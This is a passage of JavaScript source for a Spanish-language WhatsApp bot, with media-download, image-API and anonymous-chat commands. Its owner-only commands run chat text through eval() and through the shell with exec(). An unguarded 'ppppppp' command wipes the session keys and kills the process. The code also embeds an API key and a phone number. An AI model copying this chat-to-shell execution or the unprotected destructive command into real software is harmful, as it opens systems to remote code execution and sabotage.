caption += `ᴛɪᴛᴜʟᴏ : ${data.result.title}\n`
caption += `ᴀʀᴛɪsᴛᴀ/s : ${data.result.artists}\n`
caption += `ᴅᴜʀᴀᴄɪᴏɴ : ${data.result.duration}\n`
caption += `ᴘᴏᴘᴜʟᴀʀɪᴅᴀᴅ : ${data.result.popularity}\n`
caption += `ʟɪɴᴋ ᴅᴇ ᴀᴠᴀɴᴄᴇ : ${data.result.preview_url}\n\n`
caption += `_⏰ ᴇsᴘᴇʀᴇ, ᴇɴᴠɪᴀɴᴅᴏ sᴜ ᴀᴜᴅɪᴏ..._\n`
conn.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
conn.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3`, ptt: true })
})
})
break

case 'goldplaybutton':
case 'silverplaybutton':
case 'freefire':
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: ${prefix + command} Kenisawa`)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=SadTeams&text=${q}` } })
break
case 'amongus':
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: ${prefix + command} Kenisawa`)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/amongus?apikey=SadTeams&text=${q}` } })
break
case 'ssweb':
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: ${prefix + command} https://github.com/Hyzdmod`)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/ssweb?apikey=${apikey}&url=${args[0]}` } })
break
case 'shortlink':
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: ${prefix + command} https://github.com/Hyzdmod`)
axios.get(`https://api.lolhuman.xyz/api/ouoshortlink?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
reply(data.result)
})
break
case 'igdl':
if (args.length == 0) return reply(`〚❕〛ᴇᴊᴇᴍᴘʟᴏ ᴅᴇ ᴜsᴏ: \n${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
var url = data.result
if (url.includes('.mp4')) {
conn.sendMessage(from, { video: { url }, mimetype: 'video/mp4' })
} else {
conn.sendMessage(from, { image: { url } })
}
})
break

case 'ppppppp':
try {
setTimeout(async () => {
}, 0)
setTimeout(async () => {
const qrc = JSON.parse(fs.readFileSync('./gura.json'));
qrc.keys.preKeys = {}
qrc.keys.sessions = {}
qrc.keys.senderKeyMemory = {}
fs.writeFileSync('./gura.json', JSON.stringify(qrc, null, 2))
process.exit()
}, 1000)
} catch {
reply("Erro")
}
break

case 'fox':  
case 'dog':  
case 'cat':
case 'panda':  
case 'birb': 
case 'koala': 
neys = await fetchJson(`https://some-random-api.ml/img/${command}`)
anu1 = await getBuffer(neys.link)
conn.sendMessage(m.chat, { image: anu1, caption: `${mess.succes}` }, { quoted : m })
break
case '>':
case '=>':
if (!itsMeHyzd) return;
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break
default:
if (budy.startsWith('<')) {
if (!itsMeHyzd) return
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}

if (budy.startsWith('vv')) {
if (!itsMeHyzd) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('uu')){
if (!itsMeHyzd) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}

if (m.chat.endsWith('@s.whatsapp.net') && !isCmd) {
let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
if (room) {
let other = room.other(sender)
m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
contextInfo: {
...m.msg.contextInfo,
forwardingScore: 0,
isForwarded: true,
participant: other
}
} : {})
}
}

if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
conn.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
sendMessage("5493865362492@s.whatsapp.net", { text: "ʜᴏʟᴀ ᴅᴜᴇñᴏ, ᴛᴇɴɢᴏ ᴜɴ ᴇʀʀᴏʀ, ᴘᴜᴇᴅᴇs ᴀʀʀᴇɢʟᴀʀᴍᴇ? ᴀǫᴜɪ ᴇsᴛᴀ ᴇʟ ᴇʀʀᴏʀ " + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
}
